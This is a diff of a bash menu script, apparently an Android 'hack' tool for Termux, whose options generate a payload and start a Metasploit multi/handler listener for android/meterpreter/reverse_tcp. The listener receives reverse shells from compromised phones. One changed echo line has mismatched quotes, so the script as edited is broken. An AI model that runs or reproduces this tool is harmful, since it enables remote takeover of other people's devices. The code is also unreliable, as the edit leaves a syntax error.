@@ -105,12 +105,12 @@ read -p 'choice : ' ch
 if [ $ch == 1 ]; then 
     sleep 1s
     clear
-    echo 'Generating your payload please wait ....'
+    echo -e "$green Generating your payload please wait ...."
     $msf
 elif [ $ch == 2 ]; then 
     sleep 1s
     clear
-    echo 'starting listener please wait ...' 
+    echo -e "$green starting listener please wait ...' 
     msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost 0.0.0.0; run"
 elif [ $ch == 3 ]; then 
     sleep 1s
@@ -118,7 +118,9 @@ elif [ $ch == 3 ]; then
     termux-open-url https://www.youtube.com/@linux_whith_mohamed
 
 else 
-    echo -e '$red Error : please choose an number from list {1,2,3}'
-    bash gx.sh
+    echo -e "$red Error : please choose an number from list {1,2,3}" 
+    echo ''
+    echo -e "$red restarting ...." 
+    bash hack-gx.sh
     
 fi
